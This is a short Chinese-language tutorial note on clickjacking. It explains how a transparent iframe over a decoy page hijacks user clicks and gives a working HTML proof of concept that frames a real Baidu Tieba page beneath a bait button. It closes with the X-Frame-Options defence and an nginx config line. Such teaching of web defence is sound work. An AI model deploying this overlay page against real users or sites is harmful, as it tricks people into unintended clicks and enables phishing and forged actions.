# 点击劫持攻击

## 介绍

> 参见：[web安全之点击劫持攻击](https://www.cnblogs.com/lovesong/p/5248483.html) 

​	该攻击原理是，将一个透明的`iframe`覆盖到一个看似安全的网页上，当用户点击看见的组件时，就会点击到透明的`iframe`上的组件，用户的操作已经被劫持到攻击者事先设计好的恶意按钮或链接上，攻击者既可以通过点击劫持设计一个独立的恶意网站，执行钓鱼攻击等；也可以与 XSS 和 CSRF 攻击相结合，突破传统的防御措施，提升漏洞的危害程度。

## 实现方式

 	实现原理就是将不可见的网页放到1个`iframe`标签中，通过适当的布局调整，使可见的按钮正好与不可见的页面上的按钮重合

```html
<!DOCTYPE HTML>
<html>
<meta http-equiv="Content-Type" content="text/html; charset=gb2312" />
<head>
<title>点击劫持</title>
<style>
     html,body,iframe{
         display: block;
          height: 100%;
          width: 100%;
          margin: 0;
          padding: 0;
          border:none;
     }
     iframe{
          opacity:0;
          filter:alpha(opacity=0);
          position:absolute;
          z-index:2;
     }
     button{
          position:absolute;
          top: 315px;
          left: 462px;
          z-index: 1;
          width: 72px;
          height: 26px;
     }
</style>
</head>
     <body>
          那些不能说的秘密
          <button>查看详情</button>
          <iframe src="http://tieba.baidu.com/f?kw=%C3%C0%C5%AE"></iframe>
     </body>
</html>
```

## 防御方式

> 我们的防御，是防止其他网站将我们的网站页面变成透明的页面放到其他网站上
>
> 可以通过对所有页面设置`X-Frame-Options`响应头来防止该攻击

- `X-Frame-Options`的可取值有3个：
  - DENY：不能被嵌入到任何iframe或frame中。
  - SAMEORIGIN：页面只能被本站页面嵌入到iframe或者frame中。
  - ALLOW-FROM uri：只能被嵌入到指定域名的框架中。

- nginx配置

  ```properties
  add_header X-Frame-Options SAMEORIGIN;
  ```

  一般使用`SAMEORIGIN`即可